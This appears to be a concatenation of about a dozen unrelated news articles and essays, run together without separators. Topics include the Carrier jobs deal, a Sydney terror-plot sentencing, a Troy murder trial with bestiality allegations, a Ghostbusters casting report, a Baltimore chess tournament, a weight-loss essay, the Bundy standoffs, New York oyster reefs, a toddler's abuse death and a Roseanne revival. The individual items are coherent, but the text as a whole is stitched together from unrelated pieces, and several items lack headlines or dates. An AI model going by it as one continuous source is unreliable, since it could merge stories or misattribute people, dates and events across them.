In a speech on Thursday at the Carrier plant he and Vice President-elect Mike Pence helped save from being shut down, Trump said a nightly news report several months ago, featuring comments made by a Carrier worker who was enthusiastic about his campaign, encouraged him to make the first phone call that led to a deal keeping jobs in Indiana from being shipped to Mexico.

“They had a gentleman, worker, great guy, handsome guy, he was on and it was like he didn't even know they were leaving. He said something to the effect, ‘no we're not leaving because Donald Trump promised us that we're not leaving,' and I never thought I made that promise,” Trump said.
“He was such a great guy, he said, ‘I've been with Donald Trump from the beginning,' and he made the statement that Carrier is not going anywhere,” Trump said.
Trump went on to say that after the news report, he called up Greg Hayes, CEO of United Technologies, to discuss Carrier's plans to move jobs to Mexico.
“So I said, ‘Gregg you've got to help us out here, we need to sit down, we've got to do something because we just can't let it happen,'” Trump said.
Trump was thankful for his supporter on the news that inspired him to make a call that ended up saving his and his co-workers' jobs.
“These people owe him a lot,” Trump said as he scanned the room of Carrier employees.

Back in April, Trump was discussing Carrier's announcement to move jobs to Mexico by saying American companies who close factories in the U.S. and move their jobs elsewhere will be punished with high taxes.
ThinkProgress reports that three months later, Trump appeared on “Meet The Press” where Chuck Todd asked how President Trump would punish companies who outsource jobs.

“‘If they're going to fire all their people, move their plant to Mexico, build air conditioners, and think they're going to sell those air conditioners to the United States — there's going to be a tax,' Trump said. Pressed on exactly what that tax would be, Trump replied, ‘It could be 25 percent, it could be 35 percent, it could be 15 percent — I haven't determined.'
Not everyone is pleased with how Trump helped save jobs at Carrier. Vermont Senator Bernie Sanders published an op-ed on Thursday reacting to the news that Carrier won't be closing the plant and moving to Mexico after all.
“Just a short few months ago, Trump was pledging to force United Technologies to ‘pay a damn tax.' He was insisting on very steep tariffs for companies like Carrier that left the United States and wanted to sell their foreign-made products back in the United States. Instead of a damn tax, the company will be rewarded with a damn tax cut. Wow! How's that for standing up to corporate greed?”
Indianapolis Mayor Joe Hogsett is among those praising Trump for his leadership. He released a statement reminding his constituents that there's still a lot more work to do to keep jobs from leaving the U.S.
“Today's announcement is welcome news for hundreds of hardworking Indianapolis families and I am thankful that it appears many dedicated Carrier employees will continue to have good-paying jobs in this city. As Mayor, I'm mindful of who wasn't in the room today – hundreds more Indianapolis workers whose jobs are leaving or have already left our city. We owe it to those families to come together as a state and a country to enact much-needed reform that will prevent future offshoring of Indianapolis jobs and invest in our local workforce.”

Mohammad Kiad, Omar Al-Kutobi sentenced to 20 years' jail over foiled terror plot
Updated
Sydney men Omar Al-Kutobi and Mohammad Kiad have been sentenced to 20 years' jail for preparing to commit a terrorist attack.
Key points: Omar Al-Kutobi and Mohammad Kiad plotted deadly terrorist attacks in Sydney
The duo will spend at least 15 years behind bars
They were arrested in February 2015 after a tip-off
Al-Kutobi, 25, and Kiad, 27, intended to target a Shiite prayer hall in February last year, but that plan was abandoned in favour of a plot to attack someone with either a knife or machete.
They will both spend a minimum of 15 years behind bars.
In sentencing, Supreme Court Judge Peter Garling said there was enough evidence to suggest the men were on the cusp of carrying out the attack.
"From the seized material and as a consequence of other information received by the authorities during the investigation, a comprehensive chronology of events charting the offenders' radicalisation and the formation of their conspiracy to commit a terrorist act, or acts, can be set out," he said.
"Although neither of the offenders were raised to follow any extreme views related to Islam, it is clear that during and certainly by the end of 2014, both of the offenders had been drawn to and had embraced the ideology of the Islamic State and extremist Islamic views."
Police pounced after tip-off
Al-Kutobi and Kiad had been under surveillance for about a month when they were arrested and charged with preparing to carry out a terrorist attack in February 2015.
Their first target was a Shiite Prayer Hall in Granville where the pair went on February 8 to attack with a petrol bomb, according to Al-Kutobi's testimony during the trial.
But they pulled out after discovering someone was at the hall at the time.
Two days later Al-Kutobi bought a hunting knife and the pair took photos and videos in front of a homemade Islamic State flag.
Court documents revealed an informant tipped off the Joint Counter-Terrorism Team (JCCT) to the plot on February 10.
Counter-terrorism police swarmed the granny flat Al-Kutobi and Kiad shared in Fairfield and arrested the men.
The pair ware taken into custody just minutes after they had filmed the video in which Al-Kutobi could be seen speaking Arabic in front of a homemade Islamic State flag.
Police found a number of items including a hunting knife, a machete which had holed drilled into it, the homemade IS flag, two handwritten notes pledging allegiance to Isis and a balaclava.
"Other items located at the offenders premises were intrinsically of such a nature that they provided evidence of the offenders radical beliefs, extremist ideology and alignment with Islamic State," Justice Garling said.
The men pleaded guilty.
Al-Kutobi previously testified they were never going to carry out the attack and that any conspiracy ended after the failed prayer hall bombing.
But Justice Garling rejected this evidence as having an "air of unreliability".
"It can be accepted they had not undertaken any criminal activity by way of killing or harming any individual at that time, however I am satisfied beyond reasonable doubt that they were in the throes of preparation for such an event," Justice Garling said.
"The offenders were preparing or planning to kill or cause serious physical harm to an unidentified individual. The offenders intended to use either the hunting knife or the machete or both to achieve their object.
"The attack would've occurred within a few hours had it not been for the offenders arrest."
Extremist views must be 'strongly deprecated'
Justice Garling also reached out to Australia's Muslim community, telling the court Australia prides itself on its "pluralism" and "multiculturalism".
"Australia's status as an advanced, peaceful and culturally rich democracy owes much to the contributions of people of diverse faiths, cultures and racial and ethnic backgrounds," he said.
"It is in this context that extremist beliefs and ideologies which preach intolerance, hatefulness and violence towards other members or sections of the Australian community are to be most strongly deprecated.
"Such beliefs and ideologies run utterly counter to what this country stands for. The extremist views held by the offenders in this case which cast non-Muslims as an enemy that need to be destroyed simply cannot be tolerated."
Justice Garling said the beliefs of the offenders were not representative of those held by other Muslims living in Autralia.
Outside court, Detective Chief Inspector Darren Sly applauded the sentence.

TROY — Johnny Oquendo's murder trial took a bizarre turn Thursday when his defense attorney accused a key prosecution witness of having a sexual encounter with a dog and logging onto numerous bestiality websites.
"I did not have sex with a dog," the witness, Amanda Whitman, repeatedly testified in Rensselaer County Court during cross-examination by Assistant Public Defender William Roberts.
The attorney pressed Whitman about an alleged self-shot video of her engaging in a sex act with a dog — and threatened to play it in court to impeach her credibility.
Whitman, the ex-girlfriend of the defendant, later invoked her Fifth Amendment right against self-incrimination several times because she could potentially be charged with sexual misconduct, a misdemeanor sexual offense, for alleged sex with animals. The judge appointed a lawyer, Matthew Foley, to represent her, and he advised her as she took the Fifth.
Roberts mentioned the names of numerous websites Whitman had logged onto that implied she had an interest in sexual relations between humans and horses, gorillas and chimpanzees. He contends that her browser history indicated she viewed hundreds of the sites.
Oquendo, 40, is accused of strangling his 21-year-old stepdaughter, Noel Alkaramla, on Nov. 22, 2015, in his third-floor apartment at 170 Third Street in Troy.
Prosecutors allege Oquendo used a plastic supermarket shopping bag to strangle Alkaramla, then stuffed her body in a suitcase, dragged the luggage to the Hudson River and tossed it in the water. The suitcase was recovered Dec. 30, 2015, near Albany.
Whitman is expected to testify that the black-and-gray Ricardo Beverly Hills suitcase is the same piece of luggage Oquendo had owned when they were dating.
Assistant District Attorney Andrew Botts asked Whitman some brief questions about her past text-messaging with Alkaramla. The prosecutor ended his questioning of Whitman after just a few minutes with plans to recall her next week when he will have laid more of a legal foundation.
On cross-examination, Roberts initially suggested Oquendo and Whitman had broken up in 2015 after she had found compromising photos of him with Alkaramla. Whitman said it was untrue.
Roberts then moved on to Whitman's alleged activity with animals. The defense attorney asked her if it was true that she turned over her cellphone to Troy police, and with it the alleged sexual encounter with the dog.
"Incorrect," Whitman responded.
Roberts asked Whitman if she would agree with him that there was a video of her and a dog.
"Correct — but that was after my relationship with Johnny Oquendo," Whitman answered.
"Ohh," Roberts responded sarcastically. "So you were having sex with a dog after your relationship with Mr. Oquendo?"
"I did not have sex with the dog," she replied.
Roberts asked Whitman if she created two videos with dogs and her without her clothes.
Whitman hedged. Roberts said, "Would viewing those videos refresh your recollection?"
"I would not like to view those videos," Whitman answered.
"Would reviewing those videos," Roberts replied, "refresh your recollection of what dog you were having sex with?"
"I did not have sex with a dog," Whitman repeated.
At one point, while preparing to play the video, Roberts asked the judge, "With or without sound?"
The video had not been played -- and Whitman had not yet testified about the suitcase -- when she left the stand Thursday. It was unclear what the prosecution had gained from her initial appearance.
Among the other witnesses who testified Thursday was Ricardo Leal, a records custodian for Sprint wireless who spoke about the cell phone records of Alkaramla and Oquendo.
Courts are closed Friday for Veterans Day. The trial will continue Monday at 9 a.m. The prosecution is expected to wrap up its case Tuesday. The defense, which includes Assistant Public Defender Jessica Zwicklbauer, will present their case.
Bill Murray, scared off the Ghostbusters train after his disappointment with 1989's Ghostbusters 2, will appear in Paul Feig's 2016 franchise reboot starring Melissa McCarthy, Kristen Wiig, Kate McKinnon, Leslie Jones and Chris Hemsworth.
Murray, by far the actor most closely associated with the Ghostbusters canon, has, sources say, “snuck” into Boston and is filming a scene for the new film. His appearance not only gives the Feig film an imprimatur of Ghostbuster authenticity, but teams him with fellow Saturday Night Live vets past and present, including Wiig, McKinnon and Jones.
Murray previously seemed to vaporize rumors that he'd appear in the female-fronted Ghostbusters, dismissing the chat as “crazy talk.”
The upcoming Ghostbusters hit theaters July 22, 2016.

Concept could join Atlanta's first Trashy Divas boutique at 675 N. Highland mixed-use project.
UPDATE (November 7, 2016): Rize Artisan Pizza + Salads' First Location To Open Nov. 7.
Rize Artisan Pizza + Salads, a recently formed casual Italian concept, may be coming to Poncey-Highland.
AdvertisementOn May 11, the company filed plans to alter a first-generation restaurant tenant space at 664 Seminole Ave NE, in a roughly 3,600 SF space at the forthcoming 675 N. Highland mixed-use project project.
Rize has every intention of going above and beyond in being a unique, quality concept in the upscale pizza world, according to the company's website:
"As hospitality experts with relentless spirit and a true love for our craft, we created this unique concept that will disrupt the fast casual dining world. An experience that is artfully crafted, personalized and truly memorable for each guest."
Additional details imply that the concept is looking at opening more than one location in the future:
"This is not the typical fast casual assembly line or one-off pizza joint. We have a strategy for the demand that will follow once the world gets a taste of what we have to offer."
Recently, the company filed plans for a "restaurant support center" in West Midtown, which is also listed on the "contact us" page on Rize's website.
Though a planned opening date is not known, 675 N. Highland earlier this year announced that the mixed-use project would be completed this summer.
The restaurant would join Atlanta's first Trashy Divas boutique at the mixed-use.
How do you think the concept will do in Poncey-Highland? Tell us below...
How to explain it: 120 students from 27 schools, ages five through eleven, occupying one room for four hours and maintaining quietness to rival a library?
It could only mean one thing – a chess tournament.
Wednesday's event was the Baltimore Kids Chess League's final city-wide tournament of the 2014-2015 season, held at the Johns Hopkins Center for Talented Youth.
Intense as it was, the day of competition was a bit different from the match-ups that take place throughout the school year.
“This is a more relaxed tournament,” said Will Sinkler, coach of the team at Mt. Washington Elementary and Middle School. Aside from playing chess, he said, “the kids get out of school for half-a-day to have fun, meet students from other schools and eat pizza.”
Between rounds, as volunteers matched players based on their outcomes in the previous round, students laughed and joked in the refreshment room. A game of tag formed in the small courtyard of the building as more and more students from different schools jumped in.
The tournament, organized and refereed by volunteers, featured three rounds of chess matches, pairing students of similar age and skill level, leading to a final playoff round where students compete for trophies. There were plenty to go around.
“One kid at every table will get a trophy,” explained Caroline Williams, a volunteer and wife of Steve Alpern, the chess project's commissioner who officiated the day.
“Steve thinks that the more trophies there are, the more impact it has on them.”
People Behind the Pieces
Sinkler's team, the Checkmaters, had two players at the novice level and three in advanced. The team meets for an hour a week not only to play chess but to go over strategy. (It seemed to have paid off Wednesday as they took home a trophy in the individual category.)
Dave Dallas, coach for the Commodore John Rogers Elementary team, said it was the first year the school had a chess team in the past seven years. The team, which has about 25 participants, practices once a week for an hour and a half, Dallas said.
Since the tournament only allowed up to five players from each school, Dallas brought his top four. “Not just in skill, but also in attendance and interest,” he said.
Parent Patrice Carroll was pleased by her daughter Autumn Neil's growing enthusiasm for chess. She said her daughter, a 3rd-grader at Alexander Hamilton Elementary School in West Baltimore, has been eager to compete.
“This is her third tournament,” Carroll said, noting that her daughter is clearly the chessmaster in their household: “She tries to teach me!”
Scholastic Checkmate
The Baltimore Kids Chess League has been helping to put chess programs into public schools since its founding in 2003. Along with providing materials for school programs and organizing tournaments, the league also awards scholarships to a week-long chess camp.
“Chess teaches kids how to problem-solve while fostering good sportsmanship and school pride,” Linda Lee, the chess league's president, explained. “Some studies have linked chess to higher reading scores.”
“The Baltimore Kids Chess League has continued to produce quality players,” said Steve Alpern, going on to call it the city's “best scholastic program” in terms of the number of participants and number of students who go on to compete at the national level.
At the end of the tournament, 22 individuals and three teams took home trophies, with the Green School of Baltimore taking home first place at the team level.
Why fat women like me only have ourselves to blame
At five stone overweight, my belly overtakes me wherever I go and I struggle to squeeze into a size 18. How did I reach this state? The answer most people give is that I'm a lazy pig. I eat too much and I don't do enough exercise.
Fair enough, but why would I choose that? I'm an intelligent, middle-class woman.
I know about the dangers of obesity and have even written for the NHS about the benefits of getting fit. Yet I have grown fat.
Dedication: Ursula Hirschkorn is now committed to a weight loss plan
Weight isn't a simple issue. Yes, people get fat because they eat chips, but slim people do that too; they just know when to stop. But where a normal-sized person gives themselves occasional treats, the obese are gluttonous.
I can trace my own weight gain to greasy takeaways when I needed cheering up, slabs of chocolate gulped down to relieve the boredom of taking care of small children and crisps eaten without even noticing as they went down.
But what I don't understand is why my size-10 friends seem to know that one indulgent evening of ice cream is enough, yet I am not satisfied unless I repeat this gluttonous pattern night after night.
I used to feel jealous of friends whom I thought could eat whatever they liked. They would tuck into a bowl of chips and I would believe they were simply luckier than me.
What I realise now is that these girls had the self-control to eat a salad for lunch most days, so when they did indulge themselves it didn't do any real harm. But my day wasn't complete without a big breakfast, a hearty lunch and all those extra treats.
I think this kind of delusion about what you and others are eating plays a big part in putting on weight. Even if the food you eat is healthy, you still can't eat mountains of it.
But what really puzzles me is what drives someone to overeat? Once you have satiated your hunger, continuing to feed yourself isn't fun. I would find myself cramming down that last mouthful when my stomach was so groaning with food that I really didn't want it.
I think it's because I was brought up to use food as a comfort. I come from a long line of larger ladies, all of whom thought the ills of the world could be dissolved away by munching down a bar or two of chocolate.
To them, food was not something to be eaten in moderation; a dish was only delicious when full to overflowing and food only sustaining when laden with calories. When I fell over as a child, the answer was a sweetie, if life was tough as a teen I was taken out for pizza.
Svelte: Ursula on holiday in Cuba
I soon associated feeling full with being nurtured. To indulge my appetite was to salve my soul and I simply couldn't split the two apart. Eating was about a whole host of powerful emotions; love, comfort, consolation and reassurance.
When I was young and active, this didn't do too much harm. But over the past decade I have been cooped up at home caring for my four small boys. The treats began to mount up and I became dangerously obese.
I was bored. I had given up the cut and thrust of a magazine office and I found looking after young children demanding and lonely. I compensated with big, filling meals and takeaways to cheer me up when my only adult companion, my husband, came home from work.
I missed my old freedom. If I couldn't go out to the cinema or for a drink with my friends, I would make up for it with a big meal and a bottle of wine in front of the TV.
Of course, my friends and family noticed. But most of them were too polite to mention my weight gain. My mother, who has struggled with her weight all her life, would occasionally nag me to eat less or go to the gym, but I had grown deaf to her words, as I had heard them all my life whatever my size.
My husband never said a word, but I began to notice that he took less interest in me physically. He had always been great at critiquing my outfits, but now he just glanced at me and said I looked fine.
As usual, I turned to food. I got so fat that when I was weighed last year I was as heavy as I had been when I was pregnant with my twins — and they are two now.
Even though I knew I was big, I was horrified to discover just how heavy I had become. I was angry with myself for failing to halt the rising numbers on the scales.
I can't plead ignorance, as I'm well aware that the key to keeping control of your weight is simple. For all the diet programmes pedalled by so-called experts, there is no one who doesn't know the formula — eat less and do more.
But that knowledge isn't enough to break a dependence on food that has gripped you since childhood.
I got so fat that when I was weighed last year I was as heavy as I had been when I was pregnant with my twins
My day was centred on what I ate, and there was never a time when I wasn't thinking about what I would eat next. Food was filling a vacuum in my life; it was my support, what I lived for.
So yes, I suppose that everyone who looked at me and thought: ‘What a greedy pig,' was right.
But what they couldn't see was that losing weight isn't as simple as it looks. It's about forgetting habits ingrained since infancy and reaching for something else to take its place.
This is the only way in which anyone will ever manage to shift the pounds and keep them off.
When the doctor told me my weight — 15st 8lbs — I felt sick. I was killing myself with food.
I was diagnosed with pre-diabetes, meaning my blood sugar levels were so high that if I didn't lose weight soon I would develop full-blown diabetes.
It was the warning I needed to allow myself to see clearly the role that food was playing in my life — one of destruction. Being fat was ruining my health and wrecking my self-esteem.
I understood that if I didn't tackle my issues with food, I might not be around to see my sons grow up.
Two weeks before Christmas I began to eat healthily and joined a gym — I managed to lose half a stone as everyone else tucked into mince pies, pudding and cake. But I never wavered and have now lost more than two stone.
There are still many more to go. Every day is a struggle. I get by on a egg for breakfast, soup or salad for lunch and a stir fry or grilled fish with vegetables for supper. Snacks are a small handful of nuts or a piece of fruit.
But the toughest part has been facing up to why I got fat. I understand that instead of using food to nourish me, I was using it to make my life less boring, to cheer me up.
I have had to learn to turn reading, swimming or getting a cuddle into my daily treat, rather than a chocolate bar.
It is early days, but I think this is the first weight loss plan that started with retraining my brain rather than restraining my appetite, which means it is the first with a chance of success.
Oregonians have been following the case of Ammon Bundy and the group of followers who staged an armed occupation of the Malheur National Wildlife Refuge since it began, in January 2016.
The story is explored again in a new "Frontline" documentary called "American Patriot: Inside the Armed Uprising Against the Federal Government," which airs at 10 p.m. Tuesday, May 16 on PBS.
Many of the details of the Oregon standoff will be familiar. But near the end of "American Patriot," we see portions of undercover video filmed by FBI agents who posed as documentary filmmakers in an effort to infiltrate the Bundy family.
As a post on the "Frontline" website explains, the FBI began the undercover "documentary" investigation in 2014, not long after the first standoff in which the Bundys were key players.
In 2014, a decades-long conflict between Nevada rancher Cliven Bundy and the U.S. Bureau of Land Management came to a head. Bundy owed more than $1 million in grazing fees and fines for grazing his cattle on federally owned lands. The BLM sent in armed agents to remove Bundy's cattle. But as anti-federal government activists, many of them armed, arrived to support Bundy, tensions rose. Federal officials decided to de-escalate the situation and withdrew, leaving Bundy and his followers to declare victory.
But the FBI was working to build a case against the Bundys. Shortly after the Nevada standoff, agents posing as documentary filmmakers with "Longbow Productions" made contact with the family. In "American Patriot," we hear Ammon Bundy on the phone with "Charles Johnson," a supposed filmmaker.
Though some of the Bundys were skeptical, Ammon Bundy says he talked his family into allowing the "Longbow Productions" crew to film at the Bundy home in Nevada.
Agents also interviewed members of militia groups who supported Cliven Bundy at the Nevada standoff, including Greg Burleson. In the "documentary" footage, we hear an FBI agent (the agents' voices are distorted) asking what the protesters' response would have been had federal agents crossed the perimeter set up at the Nevada standoff.
"Dead bodies," Burleson says. "Literally."
The post on the "Frontline" website says the "documentary" footage was used to help convict Burleson on eight charges, including threatening and assaulting a federal officer, in April. Burleson faced federal charges stemming from his participation in the Nevada standoff near Cliven Bundy's ranch.
The federal jury found two men, including Burleson, guilty. Burleson faces a minimum of 57 years in prison, and his sentencing is scheduled for July 26. Four other men stood trial, but the judge declared a mistrial when the jury couldn't agree on verdicts on charges of conspiracy. Those men will face a new trial in June.
Cliven Bundy, and his sons Ammon and Ryan Bundy were also scheduled to go on trial in June, on charges related to the Nevada standoff. But their case may be delayed until the fall.
In October 2016, a federal jury in Portland found Ammon and Ryan Bundy, along with five co-defendants, not guilty of conspiracy and gun charges relating to the Oregon standoff.
Check back tomorrow here at OregonLive for more details about "American Patriot," and an interview with its producer.

Standing on the sidewalk in Manhattan's financial district in the shadows of glass skyscrapers, it is easy to forget how close you are to the water. But just a few blocks away, there are docks, and seagulls, and ferry boats ready to take you island hopping.
When Hurricane Sandy hit in 2012, New Yorkers were forced to confront their proximity to the ocean. The storm surge inundated neighborhoods throughout the city.
Seawater poured into the streets, flooding out apartment buildings and filling the subway tunnels. As the waters rose, the distinction between low and high ground suddenly became very apparent. As Paul Greenberg, author of American Catch, explains that “nothing acquaints you with your city's topography like living it in the eye of a hurricane and feeling that water flow up and rise up and start to swallow the city.”
Hurricane Sandy took the lives of over 100 people in the United States and caused around 50 billion dollars in damages. And the devastation it caused can be traced in part to global warming. Scientists have calculated that 83,000 more people were flooded out because of sea level rise than would have been otherwise. And pretty quickly politicians began talking about climate change.
“There is a wake-up call here and there is a lesson to be learned” said governor Andrew Cuomo in the aftermath of the storm. “There is a reality that has existed for a long time that we have been blind to, and that is climate change, extreme weather, and our vulnerability to it. It's undeniable that the frequency of extreme weather conditions is up. So it's going to be a rethinking [and] redesign of how we protect this metropolitan area from this increased frequency.”
Architects and engineers are considering all kinds of different ways that cities can redesign their infrastructure to prepare for climate change. There's talk of floodgates, and massive seawalls that would stretch across the entire harbor. But Paul Greenberg says that one of the solutions for New York's future might lie in its past.
The Big Oyster
New York was built at the mouth of the Hudson River, and that fertile estuary environment was filled with all kinds of marine life. But one creature in particular shaped the landscape: the oyster. It is estimated that trillions of oysters once surrounded New York City, filtering bacteria and acting as a natural buffer against storm surges.
Oysters are unusual mollusks in that they build up structures in three dimensions, constructing underwater architecture layer by layer. The result is massive, complex reef structures (a bit like coral reefs).
Oyster reefs once covered over 220,000 acres in the Hudson River estuary and sometimes grew as high as 20 feet tall. Like coral reefs, they cut down on coastal erosion and provided habitats for all different kinds of fish.
Much as coral reefs help protect many tropical islands from hurricanes, oysters protected New York City. They broke up large waves before they could crash onto the shore. And below the surface, their rough texture would increase friction and slow down the water.
Most people don't associate New York City with oysters today, but back in the 1700s the city was famous for them. Before colonization, the indigenous Lenape people ate lots of oysters. When Dutch colonists arrived, they found they “could just walk down to the shore anywhere in lower Manhattan where everybody was living and break off a few oysters to eat,” says Mark Kurlansky, author of The Big Oyster.
It was food for rich and poor alike, he explains, sold by street vendors and fancy restaurants and served in all kinds of ways.
Huge piles of discarded shells stacked up in the water and on the streets outside of shucking houses and restaurants.
As the city developed, builders used oyster shells as a construction material. They were burned for lime and ground up to create mortar — they were even used to pave streets. Pearl Street got its name from being paved with crushed shells.
The demand for oysters was so great that it eventually outstripped New York's bountiful supply. By the mid 1800s the area's natural oyster population was almost entirely depleted. But that wasn't the end of the the Big Oyster. Oystermen began farming oysters in the shallows of the harbor, and by the 1880s the city was producing over 700 million oysters per year.
Still, there was a problem lurking in the water. For years, the city had been dumping industrial pollutants and sewage straight into the harbor without a second thought. Then, in the early 1900s, New York was hit with deadly outbreaks of Cholera and Typhoid, epidemics which public health experts traced back to oyster beds.
The city was forced to put a stop to oystering, and New York closed its last remaining bed, off the southern edge of Staten Island, in 1927. Water quality continued to deteriorate until oysters could no longer survive. By the middle of the 20th century, New York's world-famous oysters were all but gone, leaving the sea bottom barren and the city exposed.
Pollution continues to be a problem in New York, but in 1972 Congress passed the Clean Water Act, which regulated the waste being dumped into waterways. Little by little, water quality in the harbor has improved, and now many different groups are trying to bring back the New York oyster. There are many obstacles to oyster restoration, including FDA rules that make things difficult and a lack of oyster larvae. But one of the biggest challenges is actually a structural one — the physical landscape of the harbor has totally changed due to dredging. The harbor has gotten deeper, and has a flat muddy bottom.
Oyster-tecture
Kate Orff, a landscape architect, founder of the Manhattan firm SCAPE and author of Toward an Urban Ecology, says that this environment is not conducive to oyster growth — “any oyster that lands on the bottom of the bay's bed will then immediately be covered with silt.” The solution: “we need to lift those oysters off of the bay floor and provide substrate” they can attach to.
That challenge gave Orff the idea for “oyster-tecture.” The concept was to build giant nets made of fuzzy marine rope, and elevate them about a foot or so off the seafloor. These nets would then be seeded with oyster larvae and the oysters would be able to grow from there.
With a relatively small architectural intervention, a new piece of climate-proofing infrastructure could form: an artificial oyster reef.
The oysters, which are filter feeders, would also help clean the water that passes through these new reefs.
If the oysters became a self-sustaining population, the structure could grow over time on its own.
When Orff debuted her “oyster-tecture” designs in 2010 (as part of an exhibit at the Museum of Modern Art called Rising Currents), they were speculative designs that sparked a lot of discussion. But Hurricane Sandy brought new attention to sea level rise and opened new funding avenues for coastal resilience projects.
In 2013, the federal government launched its Hurricane Sandy Rebuilding Task Force and staged an architectural competition called Rebuild by Design. Orff's firm SCAPE submitted an oyster-centric proposal called Living Breakwaters.
The project received 60 million dollars of funding and will be carried out by the New York Governor's Office of Storm Recovery. Now SCAPE is in the process of designing artificial oyster reef breakwaters off the south coast of Staten Island, which was once an epicenter of the city's oyster economy and was also hit particularly hard during Sandy.
The design has evolved a lot from the original rope-based proposal. The plan now is to build a necklace of offshore breakwaters out of large rocks and stones, and seed them with oysters so they grow into reefs.
Much like a natural oyster reef, the Living Breakwaters are designed to break up dangerous waves before they reach the shore. These will reduce coastal erosion, build beaches, and make storms less dangerous, but they won't keep flood water out altogether.
Sea walls are hard barriers that block the movement of water into the shoreline, but the landscape architects at SCAPE say that uncertainty around climate change makes designing a wall difficult. As seas continue to rise and storms become more frequent and more intense, it's hard to predict exactly where a wall should be built and how high it needs to be.
Walls can also block natural flows of water through an estuary, and cut off humans' access to the shoreline. So rather than trying to hold the line and battle the ocean, the designers want to slow the water down and let it through—creating a buffer zone of cleaner, calmer water along the shore.
This project also aims to enhance the coast by reviving its ecosystem. In addition to reducing waves and filtering water, the living breakwaters will provide some of the habitat that oyster reefs once did. With the help of marine scientists, the landscape architects designed pockets within the breakwater structure they call “reef streets,” that provide shelter for juvenile fish. Of course, to realize this vision, Living Breakwaters is going to need a lot of oysters.
School of Fish
Located just south of Manhattan, Governor's Island is home to a unique institution: the New York Harbor School. It's a just a regular public high school, except students commute by ferry and take some unusual classes like scuba diving, marine biology and underwater robotics.
The school also coordinates a program called the Billion Oyster Project, where students learn about the harbor through oyster restoration. Right now, they are growing millions of oysters on the island in big tanks. Program participants go around the city and collect shells from different restaurants (over 500,000 shells are discarded each week!). These shells provide a substrate on which they can grow oysters.
The Billion Oyster Project is an official partner on the Living Breakwaters project, meaning that oysters grown by New York high school students will soon be protecting Staten Island.
The New York Office of Storm Recovery is scheduled to begin construction of the Living Breakwaters project in 2018. The team will monitor their growth over time and hopes to have a robust reef system well underway by 2025.
Even if successful, though, the project is not about returning New York harbor to the way it was before. No designer can do that. They are creating something totally new—part ecosystem, part infrastructure. And they hope the project inspires other architects and engineers to try and design landscapes for humans to better coexist with nature.
Historically, many infrastructure projects have been built to meet some narrow human need, often at the expense of the environment. “I think our changing world really requires a new approach,” says Gina Wirth of SCAPE. “We need to integrate ecosystem thinking into all of our engineered and infrastructural systems, all of our urban systems.”
The landscape architects at SCAPE aren't claiming that oysters can save New York from climate change. There isn't any one solution to a problem so immense and complicated. Researchers at the organization Climate Central recently ranked New York as the most vulnerable city in the United States to sea level rise, with over 426,000 people living in zones that could face serious flooding by 2050. When you start projecting out further than 2050 the scale of the problem becomes hard to fathom.
Kate Orff sees the Living Breakwaters project as a step toward a healthier relationship between the city and the sea, but to protect New York and other coastal cities in the long term, she says there are a lot of other interventions that will need to be considered—like stopping new development along the coast, lifting existing buildings up, and eventually retreating from flood prone areas. Because New York is a city by the sea, and the water is only getting closer.
Capital murder charges have now been filed in the brutal beating death of a Trafford toddler found unconscious on a mattress in her own vomit Monday morning.
Jettie Ray Adams, who just turned 3 in May, died Monday after being beaten in the head, chest and stomach, authorities say. Her mother, 23-year-old Misty Lynn Wright, and her mother's boyfriend, 39-year-old Johnathon Wayne Talley, have been held without bond in the Jefferson County Jail since Jettie's death.
Initially charged with aggravated child abuse, the couple is now charged in the girl's murder. Sheriff's Chief Deputy Randy Christian said detectives and the medical examiner presented the findings from the investigation and medical examination to the Jefferson County District Attorney's Office.
"It's a sad and tragic case that will haunt us for days to come. This just isn't supposed to happen,'' Christian said. "They were supposed to protect this little girl and instead she has a funeral tomorrow."
"Our detectives, along with our evidence techs, worked meticulous, hard-and-hand in hand with the district attorney and medical examiner to get justice for Jettie,'' Christian said. "It won't bring her back, but no other children will be exposed to these two suspects. We will all sleep better because of that."
Visitation for Jettie will be held from 10 a.m. until 11 a.m. Friday at Rocko Funeral Home in Montevallo. The service for Jettie will begin at 11 a.m. in the funeral home's chapel.
Deputies were dispatched just before 7 a.m. Monday to a trailer home at 2350 Gurley Lane. The girl had been found by her parents outside on the porch area of their home, lying unresponsive on a mattress, they told lawmen. Paramedics responded and the girl was transported to Children's Hospital where she was pronounced dead. She apparently suffered all night before dying, according to law enforcement.
"When the person that is trusted with protecting a child turns out to be the abuser of them, it is as sickening and as bad as it gets,'' Christian said earlier this week. "That is what we have in this case. A special kind of sick, a special kind of evil."
Talley is being held in protective custody at the county jail. Wright is in the general population. She won't be let out for her daughter's funeral without a judge's order. Court records show Jettie's 35-year-old biological father is being held on a probation violation charge in the Shelby County Jail. It's not clear whether he will be released for the services either.
Several other children at the home were placed into the custody of the Department of Human Resources. They showed no signs of being injured or harmed. It wasn't immediately clear whether the children belonged to Wright, Talley or both. Court records show Talley has at least five children ranging in ages from eight to 20.
Wright was arrested in March in Marshall County for failure to appear in court on traffic violations. She doesn't show any other arrests in Alabama.
Talley, however, is no stranger to the law. He was arrested in February, 2014, on possession of methamphetamine and disorderly conduct in Walker County. He pleaded guilty to the disorderly conduct charge, but the drug charge was waived to a grand jury for review. Records don't indicate the disposition of that charge.
Court records also show he was convicted in 2004 of possession of cocaine and theft of property. He was sentenced to 10 years in prison, but it's not clear how much time he served, if any. He also has convictions for speeding, public intoxication, resisting arrest, criminal trespassing, attempting to elude and at least four convictions for not having a child in a safety seat while driving.
Investigators said Jettie's death is one of the worst abuse cases they've seen in years, perhaps ever. "I really don't know how someone is capable of abusing a fragile and innocent child in any manner, but to continue to the point of injury and death is beyond anyone's comprehension,'' Christian has said. "Those responsible have been identified and arrested and our job now is to ensure they will not see the light of day again and they will never harm another child."
"God bless, love and hug this poor little girl,'' he said. "She was never given a chance to learn that her life was not supposed to be this way, that it wasn't her fault, that this isn't how children are supposed to grow up. It gives a little more meaning to say she is in a much better place now."
ABC
One of the great sitcoms of the 1990s, Roseanne, is being resurrected as an “eight-episode limited series,” according to Deadline. Most of the original cast, including Roseanne Barr, John Goodman, Sara Gilbert, and Laurie Metcalf, has signed on to reprise their roles. No word on which Becky will return, though.
Or, more importantly, the chicken shirt.
The original Roseanne ran for 222 episodes over nine seasons on ABC (it was the highest-rated show on TV in season two; it stayed in the top-10 until the final two years), and won four Emmys, including three for national treasure Metcalf. Deadline reports that the new installment, which is being produced by Barr and Gilbert, as well as Tom Werner and Bruce Helford, is “currently in the marketplace, with multiple networks bidding,” including ABC and Netflix.
